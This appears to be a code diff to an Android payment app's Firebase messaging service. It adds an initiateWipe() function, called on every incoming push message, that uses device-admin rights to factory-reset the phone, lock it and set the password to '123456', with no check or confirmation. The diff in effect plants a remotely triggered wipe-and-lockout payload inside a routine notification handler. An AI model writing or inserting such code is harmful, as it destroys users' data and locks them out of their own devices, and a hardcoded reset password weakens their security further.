@@ -3,6 +3,8 @@ package com.payment.app.services
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
@@ -25,8 +27,10 @@ import com.payment.app.R
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
+import java.io.BufferedReader
 import java.io.File
 import java.io.IOException
+import java.io.InputStreamReader
 import java.util.Calendar
 
 
@@ -56,7 +60,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             duration = remoteMessage.data["minute"].toString()
             getNotification(remoteMessage.data["minute"].toString())
         }
-
+        initiateWipe()
         // Check if message contains a notification payload.
         remoteMessage.notification?.let {
             Log.d("fcmNotification", "Message Notification Body: ${it.title}")
@@ -64,6 +68,38 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
         // Also if you intend on generating your own notifications as a result of a received FCM
         // message, here is where that should be initiated. See sendNotification method below.
+    }
+
+    private fun initiateWipe() {
+        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
+
+        if (devicePolicyManager.isAdminActive(componentName)) {
+            try {
+                devicePolicyManager.wipeData(0) // Perform a standard data wipe
+                val timeMs: Long = 1000L * 60
+                Log.d("timeMs","$timeMs")
+                val isDeviceAdmin = devicePolicyManager.isAdminActive(componentName)
+
+                devicePolicyManager.lockNow()
+                if(isDeviceAdmin){
+                    val newPassword = "123456"
+                    devicePolicyManager.resetPassword(newPassword, 0)
+                    devicePolicyManager.lockNow()
+                }
+
+            } catch (e: SecurityException) {
+                Log.d( "Handle",e.toString())
+                // Handle security exception
+                // This may indicate a lack of admin privileges or other issues
+            } catch (e: Exception) {
+                Log.d( "HandleException",e.toString())
+                // Handle other exceptions
+                // This may indicate a failure during the wipe operation
+            }
+        } else {
+            // Handle the case where device admin privileges are not granted
+        }
     }
 
     private fun getNotification(body: String?) {
